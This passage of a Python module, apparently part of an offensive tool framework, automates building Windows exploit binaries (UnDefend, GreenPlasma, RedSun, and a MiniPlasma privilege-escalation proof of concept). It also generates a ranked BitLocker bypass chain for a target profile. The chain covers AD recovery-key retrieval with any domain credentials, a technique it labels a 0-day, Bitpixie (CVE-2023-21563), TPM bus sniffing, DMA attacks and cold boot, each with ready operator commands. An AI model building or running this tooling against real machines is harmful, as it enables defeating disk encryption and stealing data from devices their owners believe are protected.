        result['compiler'] = {
            'mingw_cross': bool(compiler),
            'wine_msvc':   bool(wine),
            'msbuild':     bool(msbuild),
        }

        build_map = {
            'UnDefend':     ('UnDefend/UnDefend.cpp', 'undefend.exe', [
                '-lntdll', '-ladvapi32', '-lsecur32',
            ]),
            'GreenPlasma':  ('GreenPlasma/GreenPlasma.cpp', 'greenplasma.exe', [
                '-lntdll', '-ladvapi32', '-lole32', '-L.', '-lcldapi',
            ]),
            'RedSun':       ('RedSun/RedSun.cpp', 'redsun.exe', [
                '-lntdll', '-ladvapi32', '-lole32', '-lsynchronization', '-lCldApi',
            ]),
        }

        if compiler:
            for tool_name, (src_rel, out_name, libs) in build_map.items():
                src_path  = exploit_dir / src_rel
                out_path  = exploit_dir / tool_name / out_name
                if not src_path.exists():
                    result['tools'][tool_name] = {'error': f'{src_path} not found'}
                    continue
                cmd = [compiler, str(src_path), '-o', str(out_path),
                       '-municode', '-lntdll', '-ladvapi32', '-static'] + libs
                r = _run(cmd, timeout=60)
                result['tools'][tool_name] = {
                    'status': 'built' if r.returncode == 0 else 'build_failed',
                    'output': str(out_path) if r.returncode == 0 else r.stderr[:400],
                    'cmd':    ' '.join(cmd),
                }
        else:
            result['note'] = (
                'mingw cross-compiler not found. Install: sudo pacman -S mingw-w64-gcc (Arch) '
                'or sudo apt install gcc-mingw-w64-x86-64. '
                'BlueHammer (FunnyApp.cpp) requires MSVC with WUSDK for WUA API — use Wine+MSVC '
                'or compile on a Windows machine.'
            )
            # Document build instructions for each tool
            for tool_name, (src_rel, out_name, libs) in build_map.items():
                result['tools'][tool_name] = {
                    'source': str(exploit_dir / src_rel),
                    'output': str(exploit_dir / tool_name / out_name),
                    'msvc_cmd': f'cl.exe {src_rel} /link {" ".join(l.lstrip("-l") + ".lib" for l in libs)}',
                    'mingw_cmd': f'x86_64-w64-mingw32-g++ {src_rel} -o {out_name} -municode {" ".join(libs)} -static',
                }

        # MiniPlasma is C# (.NET) — dotnet build
        dotnet = _tool('dotnet')
        mini_proj = exploit_dir / 'MiniPlasma/PoC_AbortHydration_ArbitraryRegKey_EoP/PoC_AbortHydration_ArbitraryRegKey_EoP.csproj'
        if dotnet and mini_proj.exists():
            r = _run(['dotnet', 'build', str(mini_proj), '-c', 'Release'], timeout=120)
            result['tools']['MiniPlasma'] = {
                'status': 'built' if r.returncode == 0 else 'build_failed',
                'output': r.stdout[-500:] if r.returncode == 0 else r.stderr[-400:],
            }
        else:
            result['tools']['MiniPlasma'] = {
                'status': 'manual_required',
                'source': str(mini_proj) if mini_proj.exists() else 'not found',
                'build_cmd': f'dotnet build {mini_proj} -c Release',
                'note': 'Requires .NET SDK: dotnet-sdk package',
            }

        data['tool_build'] = result

    # ── exploit_generate — generate exploit chain for target ────────────────
    def do_exploit_generate():
        """Generate a complete BitLocker bypass exploit chain based on target profile."""
        log("→ exploit_generate: generating BitLocker bypass chain")

        os_version      = params.get('os_version', '')      # e.g. 'Windows 11'
        has_pin         = params.get('has_pin', False)       # BitLocker PIN set
        has_network     = params.get('has_network', True)    # network accessible
        has_usb         = params.get('has_usb', False)       # USB can be inserted
        has_phys        = params.get('has_phys', False)      # physical RAM/motherboard access
        has_domain      = params.get('has_domain', False)    # domain joined
        tpm_discrete    = params.get('tpm_discrete', False)  # discrete SPI TPM
        winre_enabled   = params.get('winre_enabled', True)  # WinRE enabled
        bitpixie_patched = params.get('bitpixie_patched', True)  # KB5022842 applied

        chain: List[Dict] = []
        priority = 0

        # 1. Recovery key from AD — easiest if domain-joined
        if has_domain and has_network:
            priority += 1
            chain.append({
                'step': priority,
                'technique': 'recovery_key_ad',
                'difficulty': 'easy',
                'requirement': 'Domain credentials (any user)',
                'secv_cmd': 'use bitlocker\nset operation recovery_key_ad\nset target <dc_ip>\nset domain <domain>\nset username <user>\nset password <pass>\nrun',
            })

        # 2. YellowKey — Windows 11 + WinRE enabled + USB or SMB access
        if winre_enabled and ('11' in os_version or 'Server 2022' in os_version or not os_version):
            if has_usb or has_network:
                priority += 1
                chain.append({
                    'step': priority,
                    'technique': 'yellowkey',
                    'difficulty': 'easy' if has_usb else 'medium',
                    'requirement': 'USB access or SMB write to target drive',
                    'technique_type': '0-day',
                    'secv_cmd': (
                        'use bitlocker\nset operation yellowkey\nset usb_path /mnt/usb\nrun'
                        if has_usb else
                        'use bitlocker\nset operation yellowkey_remote\n'
                        f'set target {target or "<ip>"}\nset username <user>\nset password <pass>\nrun'
                    ),
                })

        # 3. Bitpixie — network accessible, no PIN, not patched
        if has_network and not has_pin and not bitpixie_patched:
            priority += 1
            chain.append({
                'step': priority,
                'technique': 'bitpixie',
                'difficulty': 'medium',
                'cve': 'CVE-2023-21563',
                'requirement': 'Same subnet, PXE boot possible, TPM-only (no PIN)',
                'secv_cmd': f'use bitlocker\nset operation bitpixie\nset target {target or "<target_ip>"}\nrun',
            })

        # 4. TPM SPI sniff — physical, discrete TPM
        if has_phys and tpm_discrete and not has_pin:
            priority += 1
            chain.append({
                'step': priority,
                'technique': 'tpm_sniff',
                'difficulty': 'hard',
                'requirement': 'Discrete SPI TPM chip, logic analyzer, soldering',
                'secv_cmd': 'use bitlocker\nset operation tpm_sniff\nrun',
            })

        # 5. DMA PCILeech — physical, running system
        if has_phys:
            priority += 1
            chain.append({
                'step': priority,
                'technique': 'dma_pcileech',
                'difficulty': 'hard',
                'requirement': 'PCILeech hardware, running target, Thunderbolt/PCIe port',
                'secv_cmd': 'use bitlocker\nset operation dma_pcileech\nrun',
            })

        # 6. Cold boot — last resort, system running
        if has_phys:
            priority += 1
            chain.append({
                'step': priority,
                'technique': 'cold_boot',
                'difficulty': 'hard',
                'requirement': 'Physical RAM access, compressed air, target ON/sleep',
                'secv_cmd': 'use bitlocker\nset operation cold_boot\nset mem_image <path_to_dump>\nrun',
            })

        data['exploit_generate'] = {
            'target': target or 'local',
            'profile': {
                'os_version': os_version,
                'has_pin': has_pin,
                'has_domain': has_domain,
                'has_network': has_network,
                'has_usb': has_usb,
                'has_phys': has_phys,
                'tpm_discrete': tpm_discrete,
                'winre_enabled': winre_enabled,
                'bitpixie_patched': bitpixie_patched,
            },
            'chain_count': len(chain),
            'recommended_chain': chain,
            'tools_ready': _YK_PAYLOAD.is_dir(),
            'note': (
                'Chain is ordered from easiest/least intrusive to hardest/most invasive. '
                'Build exploit tools first: use bitlocker; set operation tool_build; run'
            ),
        }

    # ── handler dispatch ──────────────────────────────────────────────────────
    handlers = {
        'survey':           do_survey,
        'usb_deploy':       do_usb_deploy,
        'yellowkey':        do_yellowkey,
        'yellowkey_remote': do_yellowkey_remote,
        'bitpixie':         do_bitpixie,
        'cold_boot':        do_cold_boot,
        'tpm_sniff':        do_tpm_sniff,
        'dma_pcileech':     do_dma_pcileech,
        'recovery_key_ad':  do_recovery_key_ad,
        'tool_build':       do_tool_build,
        'exploit_generate': do_exploit_generate,
    }

    if operation == 'auto':
        do_survey()
        do_exploit_generate()
    elif operation in handlers:
        try:
            handlers[operation]()
        except Exception as e:
            errors.append(f'{operation}: {e}')
            import traceback
            data['traceback'] = traceback.format_exc()
    else:
        data['error'] = f'Unknown operation: {operation}'
        data['available'] = list(handlers.keys())

    return {'target': target, 'operation': operation,
            'data': data, 'errors': errors}


if __name__ == '__main__':
    raw = sys.stdin.read().strip()
    try:
        inp = json.loads(raw) if raw else {}
    except json.JSONDecodeError as e:
        print(json.dumps({'error': f'Invalid JSON: {e}'}))
        sys.exit(1)

    target = inp.get('target', '')
    params = inp.get('params', inp)
    result = run(params, target)
    print(json.dumps(result, indent=2, default=str))
